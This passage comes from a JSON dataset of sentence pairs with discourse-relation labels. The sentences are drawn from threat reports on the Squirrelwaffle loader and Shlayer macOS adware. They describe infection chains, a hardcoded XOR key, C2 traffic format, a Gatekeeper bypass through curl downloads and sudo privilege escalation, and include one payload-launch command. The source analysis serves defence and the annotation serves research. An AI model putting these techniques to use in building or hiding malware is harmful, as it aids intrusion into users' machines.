        "S1": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.",
        "S2": "The payload is written to %ProgramData% with the filename ww1.dll.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The payload is written to %ProgramData% with the filename ww1.dll.",
        "S2": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.",
        "relation": "MISC"
    },
    {
        "S1": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.",
        "S2": "The payload DLL is executed via rundll32.exe by invoking the export function name ldr.",
        "relation": "MISC"
    },
    {
        "S1": "The payload DLL is executed via rundll32.exe by invoking the export function name ldr.",
        "S2": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:",
        "relation": "MISC"
    },
    {
        "S1": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:",
        "S2": "The threat actor behind these campaigns has changed some of their TTPs over time.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor behind these campaigns has changed some of their TTPs over time.",
        "S2": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an Auto_Open() macro, which downloads the Squirrelwafle loader from three different URLs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an Auto_Open() macro, which downloads the Squirrelwafle loader from three different URLs.",
        "S2": "The Squirrelwaffle loader is subsequently executed via regsvr32.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The Squirrelwaffle loader is subsequently executed via regsvr32.exe.",
        "S2": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.",
        "relation": "MISC"
    },
    {
        "S1": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.",
        "S2": "The hidden sheet in this Excel document is shown in Figure 7.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The hidden sheet in this Excel document is shown in Figure 7.",
        "S2": "The extracted macro code is shown in Figure 8.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The extracted macro code is shown in Figure 8.",
        "S2": "The threat actor also changed the location where the payload is written to disk.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor also changed the location where the payload is written to disk.",
        "S2": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:",
        "relation": "MISC"
    },
    {
        "S1": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:",
        "S2": "This analysis covers the Squirrelwaffle with the MD5 hash 479DAE0F72F4D57BD20E0BF8CB3EBDF7.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This analysis covers the Squirrelwaffle with the MD5 hash 479DAE0F72F4D57BD20E0BF8CB3EBDF7.",
        "S2": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.",
        "S2": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Squirrelwaffle loader samples have a recent compilation date using Visual Studio 2017 as shown in Figure 9.",
        "S2": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.",
        "S2": "Similar packers have been observed in other malware families including Ursnif and Zloader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Similar packers have been observed in other malware families including Ursnif and Zloader.",
        "S2": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.",
        "relation": "MISC"
    },
    {
        "S1": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.",
        "S2": "There are two main components: a list of CnC URLs and a list of IP addresses to block, which belong to sandboxes and analysis platforms.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There are two main components: a list of CnC URLs and a list of IP addresses to block, which belong to sandboxes and analysis platforms.",
        "S2": "These lists are obfuscated using an XOR-based algorithm with hardcoded keys.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These lists are obfuscated using an XOR-based algorithm with hardcoded keys.",
        "S2": "An example formatted Squirrelwaffle configuration is shown in Figure 10.",
        "relation": "MISC"
    },
    {
        "S1": "An example formatted Squirrelwaffle configuration is shown in Figure 10.",
        "S2": "Once the malware decodes all of the CnC domains and IP addresses to block, it creates a socket and sends the data using the send() function and receives the content from the CnC using recv() calls.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once the malware decodes all of the CnC domains and IP addresses to block, it creates a socket and sends the data using the send() function and receives the content from the CnC using recv() calls.",
        "S2": "The CnC communication protocol utilizes an HTTP POST request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key KJKLO.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The CnC communication protocol utilizes an HTTP POST request with a Base64 encoded payload that is encrypted using an XOR-based algorithm with the hardcoded key KJKLO.",
        "S2": "An example HTTP POST request is shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example HTTP POST request is shown below:",
        "S2": "Note that this request does not contain a User-Agent field in the HTTP header.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note that this request does not contain a User-Agent field in the HTTP header.",
        "S2": "The path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.",
        "S2": "This encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.",
        "S2": "Each field is delimited by a single tab character.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each field is delimited by a single tab character.",
        "S2": "An example before encryption is shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example before encryption is shown below:",
        "S2": "The HTTP POST body contains another Base64 encoded string that includes the victim\u2019s computer name, username, application data directory, and workgroup.",
        "relation": "MISC"
    },
    {
        "S1": "The HTTP POST body contains another Base64 encoded string that includes the victim\u2019s computer name, username, application data directory, and workgroup.",
        "S2": "Each field is delimited with two tab characters.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each field is delimited with two tab characters.",
        "S2": "An example payload before encryption is shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example payload before encryption is shown below:",
        "S2": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.",
        "S2": "The SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.",
        "relation": "NEXT"
    },
    {
        "S1": "The SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.",
        "S2": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim\u2019s system information that was previously sent.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim\u2019s system information that was previously sent.",
        "S2": "An example decrypted response is shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example decrypted response is shown below:",
        "S2": "The SquirrelWaffle CnC response may also contain a second-stage payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The SquirrelWaffle CnC response may also contain a second-stage payload.",
        "S2": "An example decrypted response is shown below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example decrypted response is shown below:",
        "S2": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.",
        "relation": "MISC"
    },
    {
        "S1": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.",
        "S2": "Zscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Zscaler ThreatLabz has observed Squirrelwaffle deliver an executable file with the MD5 hash 116301FD453397FDF3CB291341924147.",
        "S2": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.",
        "S2": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.",
        "relation": "NEXT"
    },
    {
        "S1": "The Cobalt Strike stager sends an HTTPS GET request to 213.227.154[.]92 with the path /jquery-3.3.1.slim.min.js.",
        "S2": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.",
        "relation": "NEXT"
    },
    {
        "S1": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.",
        "S2": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the XOR-based algorithm replicated below in Figure 13.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This binary data consists of shellcode that decrypts the Cobalt Strike beacon using the XOR-based algorithm replicated below in Figure 13.",
        "S2": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:",
        "relation": "ELABORATION"
    },
    {
        "S1": "As with much of the currently distributed adware, this malware is typically delivered via drive-by advertisements, posing as a fake Adobe Flash or related software updates.",
        "S2": "Whether you receive the malware or a generic advertisement from the compromised domain depends on your browser\u2019s user-agent string, IP address, and relative last visit.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Whether you receive the malware or a generic advertisement from the compromised domain depends on your browser\u2019s user-agent string, IP address, and relative last visit.",
        "S2": "Given this determination, TAU developed a script to rotate through proxies, visit the main advertisement domain (in this example case, dubbeldachs[.]com), follow through all redirects, detect if the site is malicious or not, capture a screenshot + page source + malware payload, and categorize the data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Given this determination, TAU developed a script to rotate through proxies, visit the main advertisement domain (in this example case, dubbeldachs[.]com), follow through all redirects, detect if the site is malicious or not, capture a screenshot + page source + malware payload, and categorize the data.",
        "S2": "Below is a sample screenshot of this script in action:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Below is a sample screenshot of this script in action:",
        "S2": "Running this script across multiple systems, we were able to capture over 50 unique samples in a matter of hours, all targeted towards macOS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Running this script across multiple systems, we were able to capture over 50 unique samples in a matter of hours, all targeted towards macOS.",
        "S2": "In total at that time, there were well over 5,000 unique hashes confirmed, meaning that banning via hash would be ineffective due to the rate at which binaries are re-compiled or otherwise modified.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In total at that time, there were well over 5,000 unique hashes confirmed, meaning that banning via hash would be ineffective due to the rate at which binaries are re-compiled or otherwise modified.",
        "S2": "The following screenshot illustrates a sample delivery site typical of Shlayer (and other adware):",
        "relation": "MISC"
    },
    {
        "S1": "The following screenshot illustrates a sample delivery site typical of Shlayer (and other adware):",
        "S2": "In addition to malicious DMG / ISO / PKG downloaders, various redirects contained browser extensions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In addition to malicious DMG / ISO / PKG downloaders, various redirects contained browser extensions.",
        "S2": "All infection vectors required user interaction at some level in order to compromise the host, including installation of software packages and authentication.",
        "relation": "NEXT"
    },
    {
        "S1": "All infection vectors required user interaction at some level in order to compromise the host, including installation of software packages and authentication.",
        "S2": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "relation": "NEXT"
    },
    {
        "S1": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "S2": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "relation": "MISC"
    },
    {
        "S1": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "S2": "To this point, all discovered samples of this malware have targeted only macOS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To this point, all discovered samples of this malware have targeted only macOS.",
        "S2": "The malware employs multiple levels of obfuscation and is capable of privilege escalation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware employs multiple levels of obfuscation and is capable of privilege escalation.",
        "S2": "Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities.",
        "S2": "Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads.",
        "S2": "The following analysis results reflect execution of a DMG-based payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following analysis results reflect execution of a DMG-based payload.",
        "S2": "Note: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "S2": "The paths noted below represent only those of the original variants directly observed and verified by TAU via binary analysis or across our customer base.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The paths noted below represent only those of the original variants directly observed and verified by TAU via binary analysis or across our customer base.",
        "S2": "The samples collected and analyzed by TAU that were derived from pirated software have a nearly identical execution chain as the traditional samples described below, with the exception of the command-line arguments to the curl command: curl -f0L versus curl -fsL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The samples collected and analyzed by TAU that were derived from pirated software have a nearly identical execution chain as the traditional samples described below, with the exception of the command-line arguments to the curl command: curl -f0L versus curl -fsL.",
        "S2": "This is an important distinction for detection, as the \u20130 (force http 1.0) argument is not generally used legitimately, whereas usage of \u2013s (silent) and \u2013S (show errors) is more common.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is an important distinction for detection, as the \u20130 (force http 1.0) argument is not generally used legitimately, whereas usage of \u2013s (silent) and \u2013S (show errors) is more common.",
        "S2": "The following represents a high-level overview of the process execution and infection chain for a typical Shlayer installation:",
        "relation": "MISC"
    },
    {
        "S1": "The following represents a high-level overview of the process execution and infection chain for a typical Shlayer installation:",
        "S2": "As referenced in the Delivery section above, many Shlayer infections are distributed as fake Adobe Flash Player updates from a compromised site, often packaged as a DMG file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As referenced in the Delivery section above, many Shlayer infections are distributed as fake Adobe Flash Player updates from a compromised site, often packaged as a DMG file.",
        "S2": "The downloaded installer is designed to look like a legitimate installation to trick the user into authenticating with their password to continue the second stage infection such as the screenshot below:",
        "relation": "NEXT"
    },
    {
        "S1": "The downloaded installer is designed to look like a legitimate installation to trick the user into authenticating with their password to continue the second stage infection such as the screenshot below:",
        "S2": "When this DMG is mounted and the installer executed, a .command script is executed from a hidden directory in the mounted volume.",
        "relation": "NEXT"
    },
    {
        "S1": "When this DMG is mounted and the installer executed, a .command script is executed from a hidden directory in the mounted volume.",
        "S2": "This script base64 decodes and AES decrypts a second script containing an additional encoded script that is subsequently executed.",
        "relation": "NEXT"
    },
    {
        "S1": "This script base64 decodes and AES decrypts a second script containing an additional encoded script that is subsequently executed.",
        "S2": "A sample .command script is shown in Figure 2 below, along with the two subsequent decoded/decrypted scripts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A sample .command script is shown in Figure 2 below, along with the two subsequent decoded/decrypted scripts.",
        "S2": "Although the format and sequence of these scripts vary among samples, the basic overall execution chain remains the same.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although the format and sequence of these scripts vary among samples, the basic overall execution chain remains the same.",
        "S2": "The second script below uses the system utilities xxd and base64 to decode a third script which ultimately performs the download of the second stage payload and initializes the final installation activity.",
        "relation": "NEXT"
    },
    {
        "S1": "The second script below uses the system utilities xxd and base64 to decode a third script which ultimately performs the download of the second stage payload and initializes the final installation activity.",
        "S2": "The decoded script in Figure 4 above represents the final steps of the first stage of this infection, performing the following after identifying the script location (e.g. /Volumes/Player/.hidden) and performing a verification check:",
        "relation": "NEXT"
    },
    {
        "S1": "The decoded script in Figure 4 above represents the final steps of the first stage of this infection, performing the following after identifying the script location (e.g. /Volumes/Player/.hidden) and performing a verification check:",
        "S2": "- Collects system information such as the macOS version and IOPlatformUUID (a unique identifier for the system)",
        "relation": "NEXT"
    },
    {
        "S1": "- Collects system information such as the macOS version and IOPlatformUUID (a unique identifier for the system)",
        "S2": "- Generates a \u201cSession GUID\u201d using uuidgen",
        "relation": "NEXT"
    },
    {
        "S1": "- Generates a \u201cSession GUID\u201d using uuidgen",
        "S2": "- Creates a custom URL using the information generated in the previous two steps and downloads the second stage payload.",
        "relation": "NEXT"
    },
    {
        "S1": "- Creates a custom URL using the information generated in the previous two steps and downloads the second stage payload.",
        "S2": "For example:",
        "relation": "MISC"
    },
    {
        "S1": "For example:",
        "S2": "- Attempts to download the zip file payload using curl (with arguments of either \u201c-f0L\u201d or \u201c\u2013fsL\u201d as mentioned above)",
        "relation": "MISC"
    },
    {
        "S1": "- Attempts to download the zip file payload using curl (with arguments of either \u201c-f0L\u201d or \u201c\u2013fsL\u201d as mentioned above)",
        "S2": "- Creates a directory in /tmp to store the payload and unzips the password-protected payload (note: the zip password is hardcoded in the script per sample)",
        "relation": "NEXT"
    },
    {
        "S1": "- Creates a directory in /tmp to store the payload and unzips the password-protected payload (note: the zip password is hardcoded in the script per sample)",
        "S2": "- Makes the binary within the unzipped .app executable using chmod +x",
        "relation": "NEXT"
    },
    {
        "S1": "- Makes the binary within the unzipped .app executable using chmod +x",
        "S2": "- Executes the payload using open with the passed arguments \u201cs\u201d \u201c$session_guid\u201d and \u201c$volume_name\u201d as in the example below: open -a /tmp/dTpyJRei/Player.app \u2013args s 141CE8F5-BA78-4EA8-A941-933A076BA0EN /Volumes/Player/",
        "relation": "NEXT"
    },
    {
        "S1": "- Executes the payload using open with the passed arguments \u201cs\u201d \u201c$session_guid\u201d and \u201c$volume_name\u201d as in the example below: open -a /tmp/dTpyJRei/Player.app \u2013args s 141CE8F5-BA78-4EA8-A941-933A076BA0EN /Volumes/Player/",
        "S2": "- Performs a killall Terminal to kill the running script\u2019s terminal window",
        "relation": "NEXT"
    },
    {
        "S1": "- Performs a killall Terminal to kill the running script\u2019s terminal window",
        "S2": "After the second stage payload is downloaded and executed, it attempts to escalate privileges with sudo using a technique invoking /usr/libexec/security_authtrampoline as discussed in Patrick Wardle\u2019s DEFCON 2017 talk \u201cDeath by 1000 Installers\u201d and now documented under MITRE ATT&CK TID 1514 (Elevated Execution with Prompt)1.",
        "relation": "MISC"
    },
    {
        "S1": "After the second stage payload is downloaded and executed, it attempts to escalate privileges with sudo using a technique invoking /usr/libexec/security_authtrampoline as discussed in Patrick Wardle\u2019s DEFCON 2017 talk \u201cDeath by 1000 Installers\u201d and now documented under MITRE ATT&CK TID 1514 (Elevated Execution with Prompt)1.",
        "S2": "Once the malware has elevated to root privileges, it attempts to download additional software (observed to be adware in the analyzed samples) and bypasses Gatekeeper for the downloaded software.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the malware has elevated to root privileges, it attempts to download additional software (observed to be adware in the analyzed samples) and bypasses Gatekeeper for the downloaded software.",
        "S2": "This allows the allowlisted software to run without user intervention even if the system is set to disallow unknown applications downloaded from the internet.",
        "relation": "NEXT"
    },
    {
        "S1": "This allows the allowlisted software to run without user intervention even if the system is set to disallow unknown applications downloaded from the internet.",
        "S2": "Furthermore, many of the payloads contained within the second stage download are signed with a valid developer ID as seen in red in the screenshot below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Furthermore, many of the payloads contained within the second stage download are signed with a valid developer ID as seen in red in the screenshot below:",
        "S2": "Apple Developer IDs are used to digitally sign applications with a certificate which is used by Gatekeeper on macOS as a first step in validation of a binary for safety.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Apple Developer IDs are used to digitally sign applications with a certificate which is used by Gatekeeper on macOS as a first step in validation of a binary for safety.",
        "S2": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "S2": "Although some of this process has changed with the introduction of notarization in macOS Mojave version 10.14.5, in previous versions a dialog such as the following would be displayed when opening an application that was not installed from the App Store:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although some of this process has changed with the introduction of notarization in macOS Mojave version 10.14.5, in previous versions a dialog such as the following would be displayed when opening an application that was not installed from the App Store:",
        "S2": "If we examine one of the first stage Shlayer DMG packages, we can see that the initial executable that is launched by the installer is signed by a valid Apple Developer ID (in the case illustrated below, Brianna Sanchez).",
        "relation": "MISC"
    },
    {
        "S1": "If we examine one of the first stage Shlayer DMG packages, we can see that the initial executable that is launched by the installer is signed by a valid Apple Developer ID (in the case illustrated below, Brianna Sanchez).",
        "S2": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "relation": "NEXT"
    },
    {
        "S1": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "S2": "As Apple Developer accounts have previously been fairly easy to register (just requiring an Apple ID and $99 yearly fee), almost anyone could create an application with a valid certificate.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As Apple Developer accounts have previously been fairly easy to register (just requiring an Apple ID and $99 yearly fee), almost anyone could create an application with a valid certificate.",
        "S2": "Since the time of our first reporting earlier last year however, Apple introduced additional security measures to both the registration of developer IDs as well as the execution of kernel extensions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Since the time of our first reporting earlier last year however, Apple introduced additional security measures to both the registration of developer IDs as well as the execution of kernel extensions.",
        "S2": "As of February 27th 2019, two-factor authentication (2FA) is required for the main holder of a team\u2019s Apple Developer account to sign in with their Apple ID, creating an additional layer of security for the creation of certificates.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As of February 27th 2019, two-factor authentication (2FA) is required for the main holder of a team\u2019s Apple Developer account to sign in with their Apple ID, creating an additional layer of security for the creation of certificates.",
        "S2": "This is significant as Apple\u2019s form of two-factor authentication varies from typical 2FA systems which just require a verification code from an email or SMS message.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is significant as Apple\u2019s form of two-factor authentication varies from typical 2FA systems which just require a verification code from an email or SMS message.",
        "S2": "Validity of an application\u2019s certificate can be verified using the spctl or codesign commands as seen below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Validity of an application\u2019s certificate can be verified using the spctl or codesign commands as seen below:",
        "S2": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "relation": "MISC"
    },
    {
        "S1": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "S2": "Sanchez Scarlett Nichols Carson Clement Dana Jasper Osmund Rios Becky Simmons Brianna Fergus Basil Beatrix Hilary Andrews Declan Raymond Amanda Arnold Eleanor Blanche Augusta Bennett Marvin Janson Chase Leighton Ganesa Mendez Melody",
        "relation": "ELABORATION"
    },
    {
        "S1": "Sanchez Scarlett Nichols Carson Clement Dana Jasper Osmund Rios Becky Simmons Brianna Fergus Basil Beatrix Hilary Andrews Declan Raymond Amanda Arnold Eleanor Blanche Augusta Bennett Marvin Janson Chase Leighton Ganesa Mendez Melody",
        "S2": "However, unlike files downloaded from a web browser, when a file is downloaded via the command line utility curl, the quarantine attribute flag required for Gatekeeper\u2019s check is not added to the file.",
        "relation": "MISC"
    },
    {
        "S1": "However, unlike files downloaded from a web browser, when a file is downloaded via the command line utility curl, the quarantine attribute flag required for Gatekeeper\u2019s check is not added to the file.",
        "S2": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "S2": "This means that if the first stage is able to execute, the second stage script is likely to run without further prompt to the user after initial authentication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This means that if the first stage is able to execute, the second stage script is likely to run without further prompt to the user after initial authentication.",
        "S2": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "relation": "MISC"
    },
    {
        "S1": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "S2": "If the signature has been revoked, the software will exit regardless of whether Gatekeeper has been successfully bypassed.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the signature has been revoked, the software will exit regardless of whether Gatekeeper has been successfully bypassed.",
        "S2": "Apple has been revoking these falsely created certificates for Shlayer and other common malware quickly, cutting their effective time in the wild as legitimate applications very short.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Apple has been revoking these falsely created certificates for Shlayer and other common malware quickly, cutting their effective time in the wild as legitimate applications very short.",
        "S2": "Furthermore, there have been several changes to the security of the Apple Developer program with the introduction of notarization in macOS 10.14.5.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Furthermore, there have been several changes to the security of the Apple Developer program with the introduction of notarization in macOS 10.14.5.",
        "S2": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "S2": "We continue to monitor this threat however and will provide updates should anything change.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We continue to monitor this threat however and will provide updates should anything change.",
        "S2": "The status of a notarized application can be verified using the XCode command line tool stapler with the validate parameter as seen below \u2013 this command will return \u201cThe validate action worked!\u201d for a valid notarized app, but will return nothing if the app has not been notarized.",
        "relation": "MISC"
    },
    {
        "S1": "The status of a notarized application can be verified using the XCode command line tool stapler with the validate parameter as seen below \u2013 this command will return \u201cThe validate action worked!\u201d for a valid notarized app, but will return nothing if the app has not been notarized.",
        "S2": "Due to the number of known IOCs for this malware",
        "relation": "MISC"
    },
    {
        "S1": "Due to the number of known IOCs for this malware",
        "S2": ", hash-based prevention is extremely ineffective for this campaign as executables are being frequently modified and recompiled.",
        "relation": "ELABORATION"
    },
    {
        "S1": ", hash-based prevention is extremely ineffective for this campaign as executables are being frequently modified and recompiled.",
        "S2": "As of today, there are thousands of unique known samples and the list continues to grow.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As of today, there are thousands of unique known samples and the list continues to grow.",
        "S2": "Because of this, we recommend detection and monitoring strategies based around behavioral indicators rather than hash- or other IOC-based indicators.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Because of this, we recommend detection and monitoring strategies based around behavioral indicators rather than hash- or other IOC-based indicators.",
        "S2": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "S2": "This succession of activity can be seen in the sequence of screenshots below which show the execution of the final script in the first stage, using bash along with the system utilities described above to download and execute the second stage payload.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This succession of activity can be seen in the sequence of screenshots below which show the execution of the final script in the first stage, using bash along with the system utilities described above to download and execute the second stage payload.",
        "S2": "After the second stage malware downloaded by curl has been entrenched and gained root access, it is able to then download and install additional software as seen in the process tree below:",
        "relation": "NEXT"
    },
    {
        "S1": "After the second stage malware downloaded by curl has been entrenched and gained root access, it is able to then download and install additional software as seen in the process tree below:",
        "S2": "This illustrates the true danger of Shlayer: although it is considered Adware, and therefore often dismissed as a lower threat, successful infections of this malware result in the entrenchment of a backdoor that allows for the installation of any software as the root user.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This illustrates the true danger of Shlayer: although it is considered Adware, and therefore often dismissed as a lower threat, successful infections of this malware result in the entrenchment of a backdoor that allows for the installation of any software as the root user.",
        "S2": "Even though we know of no known cases of Shlayer installing any software more nefarious than additional adware or cryptominers, it has the ability to install rootkits or other more serious threats once entrenched.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Even though we know of no known cases of Shlayer installing any software more nefarious than additional adware or cryptominers, it has the ability to install rootkits or other more serious threats once entrenched.",
        "S2": "Furthermore, while the analyzed samples above do not attempt to conceal their network activity, newer samples have been reported to use further obfuscation of payloads and encryption of network traffic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Furthermore, while the analyzed samples above do not attempt to conceal their network activity, newer samples have been reported to use further obfuscation of payloads and encryption of network traffic.",
        "S2": "Despite these changes however, the ability to detect the early-stage behavioral indicators of this malware can easily prevent infection and protect the organization.",
        "relation": "MISC"
    },
    {
